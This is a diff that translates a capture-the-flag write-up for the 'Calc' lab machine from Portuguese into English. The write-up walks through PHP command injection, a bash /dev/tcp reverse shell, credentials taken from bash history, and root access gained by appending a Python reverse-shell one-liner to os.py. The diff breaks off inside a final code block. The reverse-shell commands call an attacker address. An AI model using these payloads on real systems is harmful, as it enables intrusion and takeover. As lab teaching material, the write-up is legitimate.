@@ -1,20 +1,14 @@
 ---
 title: 'Calc Writeup'
 date: '2024-11-09'
-tags: ['Command Injection', 'Linux']
+tags: ['Command Injection', 'Linux', 'Hacking Club']
 draft: false
-summary: 'A máquina Calc é vulnerável a injeção de código, acesso não autorizado a arquivos e hijacking de bibliotecas Python para escalonamento de privilégios.'
+summary: 'The Calc machine is vulnerable to code injection, unauthorized file access, and Python library hijacking for privilege escalation.'
 images: ['/static/images/calc-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/calc-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade**: Easy
-
-### **Nome**: Calc
 
 ---
 
@@ -43,25 +37,25 @@ PORT    STATE SERVICE VERSION
 |_  100000  3,4          111/udp6  rpcbind
 ```
 
-## Somente as portas 22 (SSH), 80 (HTTP) e 111 (RCP) estão abertas.
+## Only ports 22 (SSH), 80 (HTTP), and 111 (RPC) are open.
 
 ## http://172.16.7.88
 
 ![calc](/static/images/calc-writeup-images/image.png)
 
-Aplicação se trata de uma calculadora online.
+The application is an online calculator.
 
 ![calc 1](/static/images/calc-writeup-images/image1.png)
 
-Caputrei a requisição com o Burp.
+I captured the request with Burp.
 
 ![calc 2](/static/images/calc-writeup-images/image2.png)
 
-Testando command injection
+Testing command injection:
 
-Por se tratar de uma aplicação em php, a gente pode testar passar os famosos ‘backticks’, pois o php entende que deve executar o que estiver entre ```` .
+Since this is a PHP application, we can test by passing the famous ‘backticks’, as PHP understands that it should execute whatever is inside ````.
 
-Nesse caso passei o `id` no parâmetro calc.
+In this case, I passed the `id` in the calc parameter.
 
 ![calc 3](/static/images/calc-writeup-images/image3.png)
 
@@ -71,7 +65,7 @@ Nesse caso passei o `id` no parâmetro calc.
 
 `bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`
 
-`crtl+u` pra encodar no burp.
+`crtl+u` to encode in Burp.
 
 ![calc 4](/static/images/calc-writeup-images/image4.png)
 
@@ -81,7 +75,7 @@ Nesse caso passei o `id` no parâmetro calc.
 
 ## Lateral Movement
 
-Credencial do usuário `sysadmim` encontrada no histórico do bash.
+`sysadmim` user's credentials found in the bash history.
 
 ![calc 6](/static/images/calc-writeup-images/image6.png)
 
@@ -97,23 +91,23 @@ Credencial do usuário `sysadmim` encontrada no histórico do bash.
 
 ![calc 8](/static/images/calc-writeup-images/image8.png)
 
-Podemos executar o `calc.py` como root; no entanto, não temos privilégios de escrita no script.
+We can execute calc.py as root; however, we do not have write privileges on the script.
 
 ![calc 9](/static/images/calc-writeup-images/image9.png)
 
-Olhando o script, podemos ver que ele importa o modulo `os` do python, que é o modulo responsável pela execução de comandos do sistema.
+Looking at the script, we can see that it imports the **os** module from Python, which is responsible for executing system commands.
 
 ![calc 10](/static/images/calc-writeup-images/image10.png)
 
-Pra fazer o library hijacking a gente precisa ter permissão de modificar a biblioteca do os.py, que o caso fica no diretório: `/usr/lib64/python3.7/os.py`
+To perform library hijacking, we need permission to modify the **os.py** library, which is located in the directory: **/usr/lib64/python3.7/os.py**.
 
-Nesse caso temos permissão de escrita.
+In this case, we have write permission.
 
 ![calc 11](/static/images/calc-writeup-images/image11.png)
 
-Com isso, podemos adicionar uma reverse-shell em python de dentro da lib.
+With this, we can add a reverse shell in Python inside the library.
 
-Basta colocar a reverse-shell na ultima linha do arquivo:
+Just place the reverse shell on the last line of the file:
 
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.31.150",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
@@ -122,7 +116,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ![calc 12](/static/images/calc-writeup-images/image12.png)
 
-Por fim, só executar o comando: `sudo /usr/bin/python3 /opt/pycalc/calc.py`
+Finally, just run the command: sudo /usr/bin/python3 /opt/pycalc/calc.py
 
 ![calc 13](/static/images/calc-writeup-images/image13.png)
 
@@ -130,11 +124,11 @@ Por fim, só executar o comando: `sudo /usr/bin/python3 /opt/pycalc/calc.py`
 
 ## Privillege Escalation 2 (Unintended)
 
-Olhando o diretório em que o arquivo pertence, podemos verificar que temos permissão de escrita nele diretamente.
+Looking at the directory where the file belongs, we can verify that we have write permission directly on it.
 
 ![calc 14](/static/images/calc-writeup-images/image14.png)
 
-Ou seja, podemos simplesmente deletar o `calc.py` e criar outro.
+So, we can simply delete the **calc.py** and create another one.
 
 ```python
 import os
